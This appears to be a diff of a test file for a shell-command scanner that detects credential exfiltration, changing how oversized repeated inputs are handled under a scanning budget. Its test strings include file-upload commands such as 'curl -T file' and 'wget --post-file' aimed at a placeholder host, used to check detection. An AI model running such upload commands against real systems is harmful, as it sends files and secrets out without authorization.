@@ -247,11 +247,11 @@ describe("credential-exfiltration signal", () => {
     expect(large).toBeLessThan(small * 3);
   });
 
-  it("keeps large repeated senders ordinary and retains late visible uploads", () => {
+  it("closes repeated sender work and preserves uploads found before exhaustion", () => {
     const repeated = Array(256).fill("curl curl.exe /usr/bin/curl").join(" ");
-    expect(shellExfiltrationSignal(`npx ${repeated}`, CWD)).toBeNull();
-    expect(shellExfiltrationSignal(`npx ${repeated} -T file http://example.test`, CWD)).toMatch(/curl upload/);
-    expect(shellExfiltrationSignal(`npx ${repeated} wget --post-file file http://example.test`, CWD)).toMatch(/wget body/);
+    expect(shellExfiltrationSignal(`npx ${repeated}`, CWD)).toBe(SHELL_FLOOR_BUDGET_REASON);
+    expect(shellExfiltrationSignal(`npx ${repeated} -T file http://example.test`, CWD)).toBe(SHELL_FLOOR_BUDGET_REASON);
+    expect(shellExfiltrationSignal(`npx ${repeated} wget --post-file file http://example.test`, CWD)).toBe(SHELL_FLOOR_BUDGET_REASON);
     expect(shellExfiltrationSignal("npx sh -c 'echo benign' sh -c 'curl -T file http://example.test'", CWD)).toMatch(/curl upload/);
   });
 });
@@ -291,14 +291,13 @@ describe("bounded sensitive-path inspection", () => {
       const parsed = parseShellCommand(command);
       const canonical = vi.spyOn(realpathSync, "native");
       try {
-        expect(shellExfiltrationSignal(parsed, accountDirectory)).toBe(length === 1024 ? null : SHELL_FLOOR_BUDGET_REASON);
+        expect(shellExfiltrationSignal(parsed, accountDirectory)).toBe(SHELL_FLOOR_BUDGET_REASON);
         expect(shellSensitivePathSignal(parsed, accountDirectory)).toBe(SHELL_FLOOR_BUDGET_REASON);
         expect(shellScanOrdinaryAsk(parsed, accountDirectory)).toMatch(/budget exceeded|length limit/);
         counts.push(canonical.mock.calls.length);
       } finally { canonical.mockRestore(); }
     }
-    expect(counts[0]).toBeGreaterThan(0);
-    expect(counts[0]).toBeLessThan(2048);
+    expect(counts[0]).toBe(0);
     expect(counts[1]).toBe(0);
   });
 
